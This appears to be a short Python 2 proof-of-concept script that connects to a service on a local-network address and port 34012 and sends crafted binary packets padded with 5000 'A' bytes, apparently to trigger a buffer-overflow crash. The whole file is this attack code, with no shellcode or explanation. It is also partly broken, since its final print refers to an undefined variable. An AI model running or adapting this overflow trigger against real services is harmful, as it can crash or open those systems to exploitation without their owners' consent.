#!/usr/bin/python
#############
import socket
s    = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '192.168.70.131' 
port = 34012

crash   = "\x41" * 5000
payload = crash

try:
    s.connect((host, port))
    # receive and print  data from host after connecting
    s.send('\x99\xfc'+crash+'\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff')
    data = s.recv(1024)
    print "Server: "+data
    s.send('\x05\x43\x04\x00\x00\x00\x00\x00\xff\xff\xff\xff')
    data = s.recv(1024)
    print "Server: "+data
    s.send('\x06\x1b\x11\x00\x04\x00\x00\x00\xc8\x00\x48\xa0\x00\x02\x05\x00\x5e\x8b\x00\x04\x0f\x00\x00\x00\x40\x92\xdd\xa6'+crash+'\x00')
    # Send data
    print "Sent payload"+re

except:
    print "Failed to connect to " + host + " on port " + str(port)

